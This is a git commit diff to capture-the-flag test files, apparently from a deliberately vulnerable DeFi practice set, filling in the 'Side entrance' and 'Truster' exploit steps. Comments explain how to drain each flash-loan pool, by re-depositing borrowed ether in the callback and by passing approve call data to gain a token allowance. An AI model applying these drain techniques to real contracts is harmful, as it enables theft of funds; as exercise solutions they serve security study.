b58f01cab820db5d417242062dd64b84aaea009e
PanGan21 <ganelis.pan@gmail.com>
2022-07-12 17:06:42 +0200

    first 4

--- test/side-entrance/side-entrance.challenge.js
+++ test/side-entrance/side-entrance.challenge.js
@@ -1,43 +1,60 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const { ethers } = require("hardhat");
+const { expect } = require("chai");
 
-describe('[Challenge] Side entrance', function () {
+describe("[Challenge] Side entrance", function () {
+  let deployer, attacker;
 
-    let deployer, attacker;
+  const ETHER_IN_POOL = ethers.utils.parseEther("1000");
 
-    const ETHER_IN_POOL = ethers.utils.parseEther('1000');
+  before(async function () {
+    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+    [deployer, attacker] = await ethers.getSigners();
 
-    before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [deployer, attacker] = await ethers.getSigners();
+    const SideEntranceLenderPoolFactory = await ethers.getContractFactory(
+      "SideEntranceLenderPool",
+      deployer
+    );
+    this.pool = await SideEntranceLenderPoolFactory.deploy();
 
-        const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceLenderPool', deployer);
-        this.pool = await SideEntranceLenderPoolFactory.deploy();
-        
-        await this.pool.deposit({ value: ETHER_IN_POOL });
+    await this.pool.deposit({ value: ETHER_IN_POOL });
 
-        this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);
+    this.attackerInitialEthBalance = await ethers.provider.getBalance(
+      attacker.address
+    );
 
-        expect(
-            await ethers.provider.getBalance(this.pool.address)
-        ).to.equal(ETHER_IN_POOL);
-    });
+    expect(await ethers.provider.getBalance(this.pool.address)).to.equal(
+      ETHER_IN_POOL
+    );
+  });
 
-    it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
-    });
+  it("Exploit", async function () {
+    // When calling flash loan
+    // the contract only checks if the contract’s token balance has not decreased
+    // but the balance of the flashLoan caller is ignored
+    // Call flashLoan and in the callback (execute) deposit again
+    // Then the caller will have the same balance in the SideEntranceLenderPool
+    // but also tokens will be transferred to ExploitSideEntrance calling the withdraw function
+    const ExploitSideEntrance = await ethers.getContractFactory(
+      "ExploitSideEntrance",
+      deployer
+    );
+    const exploitSideEntrance = (
+      await ExploitSideEntrance.deploy(this.pool.address)
+    ).connect(attacker);
+    await exploitSideEntrance.attack();
+  });
 
-    after(async function () {
-        /** SUCCESS CONDITIONS */
-        expect(
-            await ethers.provider.getBalance(this.pool.address)
-        ).to.be.equal('0');
-        
-        // Not checking exactly how much is the final balance of the attacker,
-        // because it'll depend on how much gas the attacker spends in the attack
-        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
-        expect(
-            await ethers.provider.getBalance(attacker.address)
-        ).to.be.gt(this.attackerInitialEthBalance);
-    });
+  after(async function () {
+    /** SUCCESS CONDITIONS */
+    expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(
+      "0"
+    );
+
+    // Not checking exactly how much is the final balance of the attacker,
+    // because it'll depend on how much gas the attacker spends in the attack
+    // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
+    expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(
+      this.attackerInitialEthBalance
+    );
+  });
 });
--- test/truster/truster.challenge.js
+++ test/truster/truster.challenge.js
@@ -1,46 +1,58 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const { ethers } = require("hardhat");
+const { expect } = require("chai");
 
-describe('[Challenge] Truster', function () {
-    let deployer, attacker;
+describe("[Challenge] Truster", function () {
+  let deployer, attacker;
 
-    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
+  const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");
 
-    before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [deployer, attacker] = await ethers.getSigners();
+  before(async function () {
+    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+    [deployer, attacker] = await ethers.getSigners();
 
-        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
-        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);
+    const DamnValuableToken = await ethers.getContractFactory(
+      "DamnValuableToken",
+      deployer
+    );
+    const TrusterLenderPool = await ethers.getContractFactory(
+      "TrusterLenderPool",
+      deployer
+    );
 
-        this.token = await DamnValuableToken.deploy();
-        this.pool = await TrusterLenderPool.deploy(this.token.address);
+    this.token = await DamnValuableToken.deploy();
+    this.pool = await TrusterLenderPool.deploy(this.token.address);
 
-        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
+    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
 
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.equal(TOKENS_IN_POOL);
+    expect(await this.token.balanceOf(this.pool.address)).to.equal(
+      TOKENS_IN_POOL
+    );
 
-        expect(
-            await this.token.balanceOf(attacker.address)
-        ).to.equal('0');
-    });
+    expect(await this.token.balanceOf(attacker.address)).to.equal("0");
+  });
 
-    it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
-    });
+  it("Exploit", async function () {
+    // The flash loan contract accepts a custom function to call and a payload as its argument
+    // allows to call any contract function on the flash loan contract’s behalf which can be exploited
+    // ExploitTruster contract creates uses data as the infinite approval for token transfers
+    // takes a flashLoan of 0 so no repay has to happen and passes the data
+    // The context under which approve is executed is the flash loan contract because it is the one calling it
+    // Then the contract uses transferFrom to withdraw all pool balance
+    const ExploitTruster = await ethers.getContractFactory(
+      "ExploitTruster",
+      deployer
+    );
+    const exploitTruster = (await ExploitTruster.deploy()).connect(attacker);
+    await exploitTruster.attack(this.pool.address, this.token.address);
+  });
 
-    after(async function () {
-        /** SUCCESS CONDITIONS */
+  after(async function () {
+    /** SUCCESS CONDITIONS */
 
-        // Attacker has taken all tokens from the pool
-        expect(
-            await this.token.balanceOf(attacker.address)
-        ).to.equal(TOKENS_IN_POOL);
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.equal('0');
-    });
+    // Attacker has taken all tokens from the pool
+    expect(await this.token.balanceOf(attacker.address)).to.equal(
+      TOKENS_IN_POOL
+    );
+    expect(await this.token.balanceOf(this.pool.address)).to.equal("0");
+  });
 });
-
